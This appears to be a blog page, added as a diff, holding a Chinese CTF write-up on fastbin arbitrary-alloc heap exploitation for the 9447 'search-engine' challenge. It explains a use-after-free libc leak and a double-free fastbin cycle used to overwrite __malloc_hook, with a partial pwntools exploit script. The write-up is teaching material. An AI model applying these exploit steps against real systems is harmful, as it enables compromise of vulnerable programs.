@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by Youssef Raafat
+  Free for personal and commercial use under the MIT license
+  https://github.com/YoussefRaafatNasry/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content=""一只猫～"">
+
+  <title>dyf's blog</title>
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
+  
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">
+
+</head>
+
+
+<body class="d-flex flex-column h-100">
+
+  <main class="flex-shrink-0 container mt-5">
+  <nav class="navbar navbar-expand-lg navbar-light">
+
+  <a class="navbar-brand" href="/"><h5><b>dyf's blog</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+    </div>
+  </div>
+
+</nav>
+  <div class="col-lg-10 mx-auto mt-5 post">
+  <h1><b>Arbitrary Alloc</b></h1>
+
+<p class="post-metadata text-muted">
+  18 February 2020 -  
+  <b>13 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#heapexploit">
+      <span class="tag badge badge-pill text-primary border border-primary">HeapExploit</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#pwn">
+      <span class="tag badge badge-pill text-primary border border-primary">pwn</span>
+    </a>
+    </p>
+
+<h3 id="arbitrary-alloc">Arbitrary Alloc</h3>
+<hr />
+<p>  这种利用方式就是在目标位置伪造一个chunk，然后overwrite当前fastbin中chunk的fd指针，指向该chunk，进而实现任意写。这种漏洞往往伴随着double free，我们可以通过构造循环链表来控制fd指针。其中，最重要的步骤就是构造fake_chunk的size字段，通常我们可能会覆盖__malloc_hook，于是在其周围伪造fastbin时往往需要错位来满足size，这里可以手算，我比较习惯用<code class="highlighter-rouge">find_fake_fast &lt;addr&gt; size</code>来快速查找合适的位置:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; print <span class="o">(</span>void<span class="k">*</span><span class="o">)</span>&amp;__malloc_hook   
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>void <span class="k">*</span><span class="o">)</span> 0x7f67160bab10 &lt;__malloc_hook&gt;
+pwndbg&gt; find_fake_fast 0x7f67160bab10 0x7f
+FAKE CHUNKS
+0x7f67160baaed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA <span class="o">{</span>
+  prev_size <span class="o">=</span> 7428137358697955328, 
+  size <span class="o">=</span> 127,       &lt;-  size
+  fd <span class="o">=</span> 0x6715d7be20000000, 
+  bk <span class="o">=</span> 0x6715d7ba0000007f, 
+  fd_nextsize <span class="o">=</span> 0x7f, 
+  bk_nextsize <span class="o">=</span> 0x0
+<span class="o">}</span>
+pwndbg&gt; 
+</code></pre></div></div>
+<p>下面我们来看一道题。</p>
+
+<h3 id="search-engine"><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine/search">search-engine</a></h3>
+<hr />
+<p>  这道题是我目前做过的最复杂的题目，当然攻克之后学到了很多东西，一道题目能牵扯到这么多利用点也是很棒了。但是在刚开始分析算法的时候我基本没看懂咋回事…</p>
+
+<p>首先这个东西的功能就是可以输入一个句子，然后他把句子用空格拆成单词然后存起来。我们来看一波关键函数：</p>
+
+<ul>
+  <li>add_sentence()</li>
+</ul>
+
+<p>这个大概算法就是输入一个句子，然后存起来，然后把这个句子用空格分割成单词，然后每个单词建立一个word结构体，word的头存在<code class="highlighter-rouge">word_head</code>这个位置。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add_sentence</span><span class="p">()</span> <span class="p">{</span>
+    <span class="p">......</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the sentence size:"</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">size1</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0xFFFD</span> <span class="p">)</span>
+    <span class="n">throw_err</span><span class="p">(</span><span class="s">"Invalid size"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the sentence:"</span><span class="p">);</span>
+  <span class="n">sentence</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size1</span><span class="p">);</span>
+  <span class="n">read_by_byte</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">sentence</span><span class="p">,</span> <span class="n">size1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)(</span><span class="n">sentence</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sentence</span><span class="p">[</span><span class="n">v1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
+  <span class="n">word</span> <span class="o">=</span> <span class="p">(</span><span class="n">Word</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
+  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">sentence</span><span class="p">;</span>
+  <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">word</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">sentence</span><span class="p">;</span>
+  <span class="n">word</span><span class="o">-&gt;</span><span class="n">sentence_size</span> <span class="o">=</span> <span class="n">size1</span><span class="p">;</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">' '</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_size</span> <span class="o">=</span> <span class="o">++</span><span class="n">v7</span><span class="p">;</span>
+<span class="nl">LABEL_4:</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">v4</span> <span class="o">==</span> <span class="n">v5</span> <span class="p">)</span>
+        <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="n">v10</span> <span class="o">=</span> <span class="n">word_head</span><span class="p">;</span>
+      <span class="n">word_head</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">word</span><span class="p">;</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
+      <span class="n">word</span> <span class="o">=</span> <span class="p">(</span><span class="n">Word</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
+      <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_ptr</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">sentence</span><span class="p">;</span>
+      <span class="n">word</span><span class="o">-&gt;</span><span class="n">sentence_size</span> <span class="o">=</span> <span class="n">size1</span><span class="p">;</span>
+      <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">word</span><span class="o">-&gt;</span><span class="n">word_ptr</span> <span class="o">=</span> <span class="n">v4</span><span class="o">++</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">);</span>
+<span class="nl">LABEL_8:</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">v8</span> <span class="o">=</span> <span class="n">word_head</span><span class="p">;</span>
+    <span class="n">word_head</span> <span class="o">=</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">word</span><span class="p">;</span>
+    <span class="n">word</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">word</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Added sentence"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>经过分析，word结构体的内存分布应该是：</p>
+
+<pre><code class="language-plain">00000000 Word            struc ; (sizeof=0x28, mappedto_6)
+00000000 word_ptr        dq ?                    
+00000008 word_size       dd ?                    
+0000000C padding1        dd ?
+00000010 sentence_ptr    dq ?
+00000018 sentence_size   dd ?
+0000001C padding2        dd ?
+00000020 prev            dq ?
+00000028 Word            ends
+</code></pre>
+
+<p>用代码还原一下就是：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">Word</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">word_ptr</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">word_size</span><span class="p">;</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">sentence_ptr</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">sentence_size</span><span class="p">;</span>
+    <span class="n">Word</span><span class="o">*</span> <span class="n">prev</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<ul>
+  <li>search()</li>
+</ul>
+
+<p>  这个函数的大概算法就是从word_head开始便利word链表，然后查找对应的单词。其主要的判断逻辑在<code class="highlighter-rouge">v2-&gt;word_size == size &amp;&amp; !memcmp(v2-&gt;word_ptr,v1,size)</code>这里，就是说单词的size要和结构体中的size相等，然后单词的内容也要相等。<br />
+  接下来我们可以看到当查找到对应的句子时，会打印出对应的句子，然后问你是不是要free掉sentence。如果你free了，这个sentence的内容会被设置成<code class="highlighter-rouge">\x00</code>。但是我们注意到，sentence被free后，<strong>sentence_ptr没有被设成null</strong>，因此这里可以使用uaf漏洞泄漏unsorted-bin的地址。另外该word也没有从链表中移除，所以每次搜索还是要便利到。这时我们可以输入<code class="highlighter-rouge">\x00</code>来绕过<code class="highlighter-rouge">memcmp()</code>的检测，那怎么绕过前面的size比较呢？<br />
+  假如我们构造’aaa b’这种句子，那么 ‘b’ 这个单词size就是1，然后free之后b被设置成了<code class="highlighter-rouge">\x00</code>，于是便可以绕过整个判断。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">search</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="p">......</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the word size:"</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0xFFFD</span> <span class="p">)</span>
+    <span class="n">throw_err</span><span class="p">(</span><span class="s">"Invalid size"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the word:"</span><span class="p">);</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">read_by_byte</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">v1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Word</span> <span class="o">*</span><span class="p">)</span><span class="n">word_head</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">word_head</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">word_size</span> <span class="o">==</span> <span class="n">size</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">word_ptr</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+          <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">"Found %d: "</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_size</span><span class="p">);</span>
+          <span class="n">fwrite</span><span class="p">((</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_size</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
+          <span class="n">putchar</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">);</span>
+          <span class="n">read_by_byte</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_size</span><span class="p">);</span>
+            <span class="n">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">);</span>
+            <span class="n">puts</span><span class="p">(</span><span class="s">"Deleted!"</span><span class="p">);</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Word</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>于是我们的大概思路就是：</p>
+
+<ol>
+  <li>利用uaf，使用unsorted-bin泄漏libc的地址</li>
+  <li>使用double free构造fastbin循环链表，overwrite其fd指针为fake_chunk</li>
+  <li>在fake_chunk中覆盖__malloc_hook为one_gadget</li>
+</ol>
+
+<p>看起来很简单…其实一言难进。</p>
+
+<h4 id="leak-libc">leak libc</h4>
+<hr />
+<p>  首先我们要做的就是想办法泄漏出libc的地址，本题采用的泄漏unsorted-bin的地址的方式我也是第一次见到，有<strong>亿些</strong>细节很讲究，大致流程如下：</p>
+
+<ol>
+  <li>首先分配一个small-bin，然后free掉，它进入unsorted-bin</li>
+  <li>此时他构成一个双向链表，我们通过puts_sentence来打印其fd指针，这里的fd指针就是unsorted-bin-addr</li>
+  <li>根据unsorted-bin-addr来计算main_arena的地址，这里要对着源码进行计算…十分繁琐</li>
+  <li>去libc.so中查找main_arena的偏移地址main_arena_libc</li>
+  <li>libc的偏移offset = main_arena - main_arena_libc</li>
+</ol>
+
+<p>好的这个泄漏unsorted-bin的函数是这样的：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_bins</span><span class="p">():</span>
+    <span class="n">contain</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x85</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="s">'b'</span>
+    <span class="n">add_sentence</span><span class="p">(</span><span class="n">contain</span><span class="p">)</span>
+    <span class="n">search</span><span class="p">(</span><span class="s">'b'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>
+    <span class="n">search</span><span class="p">(</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Found 135: "</span><span class="p">)</span>
+    <span class="n">unsorted_bin</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Delete this sentence (y/n)?"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'n'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">unsorted_bin</span>
+</code></pre></div></div>
+<p>这个时候我们就拿到了unsorted-bin的地址，然后就是计算main_arena的地址了，这里需要对照源码，我先给出我的函数：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main_arena_offset</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span>          <span class="c1"># lock
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>         <span class="c1"># flag
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">10</span>    <span class="c1"># fastbins
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span>     <span class="c1"># top and lastremainder
+</span>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">index</span> <span class="c1"># bins[NBINS * 2 -2]
+</span>    <span class="n">offset</span> <span class="o">-=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">2</span>     <span class="c1"># offset to chunk head
+</span>    <span class="k">return</span> <span class="n">offset</span>
+</code></pre></div></div>
+<p>至于原因是为啥，我们得看malloc_state结构体和：</p>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_state</span>
+<span class="p">{</span>
+  <span class="cm">/* Serialize access.  */</span>
+  <span class="n">__libc_lock_define</span> <span class="p">(,</span> <span class="n">mutex</span><span class="p">);</span>
+
+  <span class="cm">/* Flags (formerly in max_fast).  */</span>
+  <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
+
+  <span class="cm">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
+  <span class="cm">/* Note this is a bool but not all targets support atomics on booleans.  */</span>
+  <span class="c1">// 这个是新加的, 所以不用管</span>
+  <span class="kt">int</span> <span class="n">have_fastchunks</span><span class="p">;</span>
+
+  <span class="cm">/* Fastbins */</span>
+  <span class="n">mfastbinptr</span> <span class="n">fastbinsY</span><span class="p">[</span><span class="n">NFASTBINS</span><span class="p">];</span>
+
+  <span class="cm">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
+  <span class="n">mchunkptr</span> <span class="n">top</span><span class="p">;</span>
+
+  <span class="cm">/* The remainder from the most recent split of a small request */</span>
+  <span class="n">mchunkptr</span> <span class="n">last_remainder</span><span class="p">;</span>
+
+  <span class="cm">/* Normal bins packed as described above */</span>
+  <span class="n">mchunkptr</span> <span class="n">bins</span><span class="p">[</span><span class="n">NBINS</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span>
+</code></pre></div></div>
+<p>前面几个字段应该比较好理解主要是最后两行：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">index</span> <span class="c1"># bins[NBINS * 2 -2]
+</span><span class="n">offset</span> <span class="o">-=</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">2</span>     <span class="c1"># offset to chunk head
+</span></code></pre></div></div>
+<p>这个其实要看bins[NBINS*2-2]的分布，这个数组是个chunk指针数组，其本身也被当作chunk来用，malloc.c中计算bins索引的函数是这样的：</p>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define bin_at(m, i) \
+  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))	     \
+        - offsetof (struct malloc_chunk, fd))
+</span>  
+<span class="cp">#define NBINS             128
+</span>
+<span class="cp">#define unsorted_chunks(M)          (bin_at (M, 1))
+</span></code></pre></div></div>
+<p>除了第一个 bin（unsorted bin）外，后面的每个 bin 会共享前面的 bin 的字段，将其视为 malloc chunk 部分的 prev_size 和 size。这里也说明了一个问题，bin 的下标和我们所说的第几个 bin 并不是一致的。同时，bin 表头的 chunk 的 prev_size 与 size 字段不能随便修改，因为这两个字段是被其它 bin 所利用的。所以其实unsorted-bin就是<code class="highlighter-rouge">bins[0]</code>，这里写这个函数其实是为了以后复用，泄漏smallbin啥的也有可能。</p>
+
+<p>接下来就是求offset：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">unsorted_bin</span> <span class="o">=</span> <span class="n">leak_bins</span><span class="p">()</span>
+<span class="n">main_arena_addr</span> <span class="o">=</span> <span class="n">unsorted_bin</span> <span class="o">-</span> <span class="n">main_arena_offset</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="n">main_arena_libc</span>
+</code></pre></div></div>
+<p>至于这个main_arena_libc是怎么弄出来的，其实就是用ida去libc.so里查<code class="highlighter-rouge">malloc_trim</code>这个函数，然后第一个if语句里就有，源码里是这样写的：</p>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
+<span class="nf">__malloc_trim</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">s</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">__malloc_initialized</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">ptmalloc_init</span> <span class="p">();</span>
+
+  <span class="n">mstate</span> <span class="n">ar_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">;</span>
+<span class="p">.......</span>
+</code></pre></div></div>
+<p>也是很烦琐的步骤。到这里，第一大步已经完成，接下来就是构造循环链表覆写__malloc_hook。</p>
+
+<h4 id="double-free">double free</h4>
+<hr />
+
+<p>  接下来我们就考虑使用double free来构造循环链表，首先我们先构造三个句子分别形如：</p>
+<pre><code class="language-plain"># size = 0x60
+aaaaa...a d 
+bbbbb...b d
+ccccc...c d
+</code></pre>
+<p>  其长度为0x60的原因是为了满足fake_chunk的size，因为malloc_hook附近合适fastbin-size的字节几乎只有0x7f，我们一算<code class="highlighter-rouge">(0x7f&gt;&gt;4)-2 = 5</code>，所以0x60加上header后等于0x70就行了。<br />
+  接下来我们search一下 “d” 然后把这三个都free掉，此时fastbin的link为<code class="highlighter-rouge">a-&gt;b-&gt;c</code>，接着我们需要重新free掉c或者b，因为a是链表尾，会被检测出double free。但是free的时候，此时c的fd指针为null，因此在<code class="highlighter-rouge">if ( *(_BYTE *)v2-&gt;sentence_ptr )</code>这一步判断的时候过不了，所以我们只能free掉b，那么此时的链表为：<code class="highlighter-rouge">b-&gt;a-&gt;b-&gt;c</code>，接下来我们重新malloc出b，然后将其fd指针修改为fake_chunk，则link为<code class="highlighter-rouge">a-&gt;b-&gt;fake_chunk</code>，接下来我们再malloc两次把a和b拿出来，就可以malloc获得fake_chunk了,所以完整的exp代码如下：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./search"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./search"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">]</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s">'search'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">main_arena_libc</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"main_arena_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena_libc</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add_sentence</span><span class="p">(</span><span class="n">sentence</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the sentence size:"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sentence</span><span class="p">)))</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the sentence:"</span><span class="p">)</span>
